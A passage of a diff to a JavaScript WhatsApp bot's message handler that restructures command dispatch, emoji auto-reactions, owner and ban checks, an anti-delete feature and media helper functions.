'🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
-                const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                m.react(randomOwnerReaction);
-            }
-        }
-
-        // Custom react settings        
-        if (!isReact && senderNumber !== botNumber) {
-            if (config.CUSTOMREACT === 'true') {
-                // Use custom emojis from the configuration
-                const reactions = (config.CUSTOMREACTEMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
-                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                m.react(randomReaction);
-            }
-        }
-
-        if (!isReact && senderNumber === botNumber) {
-            if (config.HEARTREACT === 'true') {
-                // Use custom emojis from the configuration
-                const reactions = (config.HEARTREACTEMOJIS || '❤️,🧡,💛,💚,💚').split(',');
-                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-                m.react(randomReaction);
-            }
-        }
-
-        // Check for banned users
-        const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-        const isBanned = bannedUsers.includes(sender);
-
-        if (isBanned) return; // Ignore banned users completely
-
-        const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8')); // Read sudo file
-        const ownerNumberFormatted = `${config.OWNERNUMBER}@s.whatsapp.net`;
-        const isFileOwner = ownerFile.includes(sender);
-        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-
-        // Apply mode restrictions
-        if (!isRealOwner && config.MODE === "private") return;
-        if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-        if (!isRealOwner && !isGroup && config.MODE === "groups") return;
-
-        // Handle commands
-        const events = require('./command');
-        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
-        if (isCmd) {
+            // Load command modules
+            const events = require('./command');
+            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
             const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || 
                         events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
+
             if (cmd) {
                 if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
 
                 try {
-                    cmd.function(conn, mek, m, { 
-                        from, quoted, body, isCmd, command, args, q, text, 
-                        isGroup, sender, senderNumber, botNumber2, botNumber, 
-                        pushname, isMe, isOwner, isCreator, groupMetadata, 
-                        groupName, participants, groupAdmins, isBotAdmins, 
-                        isAdmins, reply 
+                    cmd.function(conn, mek, m, {
+                        from, quoted: m.quoted, body, isCmd, command, args, q, isGroup, sender, 
+                        senderNumber, botNumber, pushname, isMe: mek.key.fromMe, isOwner, 
+                        groupMetadata: isGroup ? await conn.groupMetadata(from) : '', 
+                        groupName: isGroup ? (await conn.groupMetadata(from)).subject : '', 
+                        participants: isGroup ? (await conn.groupMetadata(from)).participants : '', 
+                        groupAdmins: isGroup ? getGroupAdmins(await conn.groupMetadata(from)) : '', 
+                        isBotAdmins: isGroup ? getGroupAdmins(await conn.groupMetadata(from)).includes(botNumber + '@s.whatsapp.net') : false, 
+                        isAdmins: isGroup ? getGroupAdmins(await conn.groupMetadata(from)).includes(sender) : false, 
+                        reply
                     });
                 } catch (e) {
-                    console.error("[PLUGIN ERROR] " + e);
+                    console.error("[ERROR CMD]", e);
+                }
+            }
+
+            // Auto reactions
+            if (config.OWNERREACT === 'true') {
+                if (senderNumber.includes(ownerNumber)) {
+                    await conn.sendMessage(from, { react: { text: '👨‍💻', key: mek.key } });
+                }
+            }
+
+            if (config.AUTOREACT === 'true') {
+                const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
+                const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+                await conn.sendMessage(from, { react: { text: emoji, key: mek.key } });
+            }
+
+            if (config.HEARTREACT === 'true') {
+                await conn.sendMessage(from, { react: { text: '💚', key: mek.key } });
+            }
+
+            // Anti-delete
+            if (config.ANTIDELETE === 'true') {
+                await saveMessage(mek, from);
+            }
+
+        } catch (e) {
+            console.log(e);
+        }
+    });
+
+    // Group update handler
+    conn.ev.on('group-participants.update', async(update) => {
+        if (config.WELCOME_GOODBYE === 'true') {
+            await GroupEvents(conn, update);
+        }
+    });
+
+    // Anti-delete handler
+    conn.ev.on('messages.update', async(updates) => {
+        if (config.ANTIDELETE === 'true') {
+            for (const update of updates) {
+                if (update.update.message === null) {
+                    const msg = await loadMessage(update.key.id);
+                    if (msg) {
+                        await AntiDelete(conn, update, msg);
+                    }
                 }
             }
         }
-
-        // Handle other event types
-        events.commands.map(async(command) => {
-            if (body && command.on === "body") {
-                command.function(conn, mek, m, { 
-                    from, l, quoted, body, isCmd, command, args, q, text, 
-                    isGroup, sender, senderNumber, botNumber2, botNumber, 
-                    pushname, isMe, isOwner, isCreator, groupMetadata, 
-                    groupName, participants, groupAdmins, isBotAdmins, 
-                    isAdmins, reply 
-                });
-            } else if (mek.q && command.on === "text") {
-                command.function(conn, mek, m, { 
-                    from, l, quoted, body, isCmd, command, args, q, text, 
-                    isGroup, sender, senderNumber, botNumber2, botNumber, 
-                    pushname, isMe, isOwner, isCreator, groupMetadata, 
-                    groupName, participants, groupAdmins, isBotAdmins, 
-                    isAdmins, reply 
-                });
-            } else if (
-                (command.on === "image" || command.on === "photo") &&
-                mek.type === "imageMessage"
-            ) {
-                command.function(conn, mek, m, { 
-                                        from, l, quoted, body, isCmd, command, args, q, text, 
-                    isGroup, sender, senderNumber, botNumber2, botNumber, 
-                    pushname, isMe, isOwner, isCreator, groupMetadata, 
-                    groupName, participants, groupAdmins, isBotAdmins, 
-                    isAdmins, reply 
-                });
-            } else if (
-                command.on === "sticker" &&
-                mek.type === "stickerMessage"
-            ) {
-                command.function(conn, mek, m, { 
-                    from, l, quoted, body, isCmd, command, args, q, text, 
-                    isGroup, sender, senderNumber, botNumber2, botNumber, 
-                    pushname, isMe, isOwner, isCreator, groupMetadata, 
-                    groupName, participants, groupAdmins, isBotAdmins, 
-                    isAdmins, reply 
-                });
-            }
-        });
     });
 
-    // ==================== UTILITY FUNCTIONS ====================
+    return conn;
+}
 
+// Add helper functions to connection object
+function addConnectionHelpers(conn) {
     /**
-     * Decode JID (Jabber ID)
+     * Decode JID
      * @param {string} jid 
-     * @returns {string} Normalized JID
+     * @returns {string} Decoded JID
      */
-    conn.decodeJid = jid => {
+    conn.decodeJid = (jid) => {
         if (!jid) return jid;
         if (/:\d+@/gi.test(jid)) {
             let decode = jidDecode(jid) || {};
-            return (
-                (decode.user &&
-                    decode.server &&
-                    decode.user + '@' + decode.server) ||
-                jid
-            );
+            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
         } else return jid;
-    };
-
-    /**
-     * Copy and forward message with options
-     * @param {string} jid 
-     * @param {object} message 
-     * @param {boolean} forceForward 
-     * @param {object} options 
-     * @returns {object} Forwarded message
-     */
-    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
-        let vtype;
-        if (options.readViewOnce) {
-            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? 
-                message.message.ephemeralMessage.message : (message.message || undefined);
-            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
-            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
-            delete message.message.viewOnceMessage.message[vtype].viewOnce;
-            message.message = {
-                ...message.message.viewOnceMessage.message
-            };
-        }
-
-        let mtype = Object.keys(message.message)[0];
-        let content = await generateForwardMessageContent(message, forceForward);
-        let ctype = Object.keys(content)[0];
-        let context = {};
-        if (mtype != "conversation") context = message.message[mtype].contextInfo;
-        
-        content[ctype].contextInfo = {
-            ...context,
-            ...content[ctype].contextInfo
-        };
-        
-        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
-            ...content[ctype],
-            ...options,
-            ...(options.contextInfo ? {
-                contextInfo: {
-                    ...content[ctype].contextInfo,
-                    ...options.contextInfo
-                }
-            } : {})
-        } : {});
-        
-        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
-        return waMessage;
-    };
-
-    /**
-     * Download and save media message
-     * @param {object} message 
-     * @param {string} filename 
-     * @param {boolean} attachExtension 
-     * @returns {string} Saved file path
-     */
-    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
-        let quoted = message.msg ? message.msg : message;
-        let mime = (message.msg || message).mimetype || '';
-        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
-        const stream = await downloadContentFromMessage(quoted, messageType);
-        
-        let buffer = Buffer.from([]);
-        for await (const chunk of stream) {
-            buffer = Buffer.concat([buffer, chunk]);
-        }
-        
-        let type = await FileType.fromBuffer(buffer);
-        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
-        
-        // Save to file
-        await fs.writeFileSync(trueFileName, buffer);
-        return trueFileName;
     };
 
     /**
